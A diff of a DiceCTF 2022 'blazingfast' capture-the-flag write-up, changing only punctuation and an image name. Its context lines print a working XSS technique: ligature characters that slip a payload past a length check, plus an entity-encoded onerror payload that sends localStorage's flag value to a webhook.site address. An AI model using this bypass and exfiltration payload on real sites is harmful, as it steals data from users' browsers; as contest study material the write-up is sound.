@@ -4,7 +4,7 @@ date: '2022-02-06'
 draft: false
 authors: ['thebish0p']
 tags: ['DICE CTF 2022', 'Web', 'XSS', 'Unicode']
-summary: 'Bypassing length limitation with unicode'
+summary: 'Bypassing length limitation with Unicode'
 ---
 
 ## blazingfast
@@ -115,13 +115,13 @@ int mock() {
 }
 ```
 
-Several checks are made on our input. Our input can’t be more than 1000 characters and a few characters are blacklisted : [`<`, `>`, `&`, `"`].
+Several checks are made on our input. Our input can’t be more than 1000 characters and a few characters are blacklisted: [`<`, `>`, `&`, `"`].
 
 > After a lot of trial and error we had an idea that in order to bypass these checks and execute our JavaScript payloads we need to bypass the 1000 characters.
 
 ![too_long](/static/images/dice-ctf-2022/blazing-fast/too_long.png)
 
-We stumbled upon an article talking about [Exploiting XSS with 20 characters limitation](https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html) by using unicode characters. In this article, the author gives us a great example :
+We stumbled upon an article talking about [Exploiting XSS with 20 characters limitation](https://jlajara.gitlab.io/web/2019/11/30/XSS_20_characters.html) by using unicode characters. In this article, the author gives us a great example:
 
 > Notice that ﬀ characters is only one character but when browsers interpret it, it will be expanded as ff two characters.
 
@@ -147,8 +147,8 @@ The issue here is that all our payload will be in upper case letters. We came up
  ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ<img src=x onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
 ```
 
-And we popped an alert !
-![XSS Alert](/static/images/dice-ctf-2022/blazing-fast/alert_pop.png)
+And we popped an alert!
+![XSS Alert](/static/images/dice-ctf-2022/blazing-fast/alert_pop.PNG)
 
 We continue by crafting a payload to extract the flag and send it back to our webhook.
 
@@ -162,6 +162,6 @@ After XML and URL encoding our input we send it to the admin bot as shown below:
 ﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃﬃ<img src=x onerror=&#X6c;&#X6f;&#X63;&#X61;&#X74;&#X69;&#X6f;&#X6e;.&#X68;&#X72;&#X65;&#X66;=&#X27;https://webhook.site/38689352-bda5-4841-80e3-4a48e1655deb?q=&#X27.&#X74;&#X6f;&#X4c;&#X6f;&#X77;&#X65;&#X72;&#X43;&#X61;&#X73;&#X65;()&#X2B;&#X6c;&#X6f;&#X63;&#X61;&#X6c;&#X53;&#X74;&#X6f;&#X72;&#X61;&#X67;&#X65;.&#X67;&#X65;&#X74;&#X49;&#X74;&#X65;&#X6d;(&#X27;flag&#X27;.&#X74;&#X6f;&#X4c;&#X6f;&#X77;&#X65;&#X72;&#X43;&#X61;&#X73;&#X65;())>
 ```
 
-Finally we receive our flag from the server :
+Finally we receive our flag from the server:
 
 ![SUCCESS](/static/images/dice-ctf-2022/blazing-fast/flag.png)
